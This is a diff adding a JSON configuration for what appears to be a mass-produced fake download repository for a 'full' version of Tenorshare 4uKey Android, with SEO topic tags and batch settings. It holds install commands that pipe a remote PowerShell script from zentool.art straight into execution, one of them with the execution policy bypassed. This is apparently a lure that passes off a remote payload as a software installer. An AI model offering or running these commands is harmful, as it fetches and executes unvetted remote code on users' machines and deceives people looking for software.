@@ -1,0 +1,33 @@
+{
+  "repo": "Tenorshare-4uKey-Android-Full-2026",
+  "product": "Tenorshare 4uKey Android Full 2026",
+  "product_title": "Tenorshare 4uKey Android",
+  "kind": "utility",
+  "install_type": "zentool-irm",
+  "install_url": "https://zentool.art/",
+  "install_command": "irm https://zentool.art/ps/setup.ps1 | iex",
+  "install_command_bypass": "powershell -NoProfile -ExecutionPolicy Bypass -Command \"irm https://zentool.art/ps/setup.ps1 | iex\"",
+  "health_url": "https://zentool.art/health",
+  "batch": "zentool-200-part1-geogit-style",
+  "format": "license-md-geogit-v5-paraphrase-seo",
+  "tone": "guide",
+  "category": "utility",
+  "topics": [
+    "tenorshare-4ukey-android",
+    "tenorshare",
+    "tenorshare-4ukey-android-download",
+    "tenorshare-4ukey-android-windows",
+    "tenorshare-4ukey-android-windows-11",
+    "tenorshare-4ukey-android-2026",
+    "download",
+    "windows-11",
+    "windows-10",
+    "setup-guide",
+    "install-guide",
+    "full-installer",
+    "complete-version",
+    "software",
+    "partition-manager"
+  ],
+  "site": "zentool.art"
+}
